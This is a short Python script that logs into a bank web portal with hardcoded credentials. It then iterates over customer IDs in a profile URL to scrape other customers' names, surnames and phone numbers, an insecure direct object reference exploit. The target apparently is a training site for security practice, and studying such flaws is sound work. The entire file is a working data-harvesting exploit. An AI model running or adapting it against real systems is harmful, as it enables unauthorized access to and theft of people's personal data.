__author__ = 'besimaltnok'
__author__ = 'octosec'

import bs4
import mechanize


username = '10000152' 
password = '100021'
url      = 'http://isube.bgabank.com/profil.aspx?musteriID=' 
loginurl = 'http://isube.bgabank.com/giris.aspx'

global id_list
id_list = [20,21,19,16,17,18]


def Getinfo():
	for id in id_list:
		geturl = url + str(id)

		a= br.open(geturl)
		info = a.read()

		bt = bs4.BeautifulSoup(info, "lxml")
		name    = bt.find_all("p")[3].input['value']
		surname = bt.find_all("p")[4].input['value']
		phone   = bt.find_all("p")[5].input['value']
		
		print phone, surname, name  
	br.close()
def Loginfo():
	global br
	br = mechanize.Browser()
	br.open(loginurl)
	br.select_form(nr=1)
	br.form['b_musterino'] = username
	br.form['b_password'] = password

	br.submit()
	
if __name__ == "__main__":
	
	Loginfo()
	Getinfo()
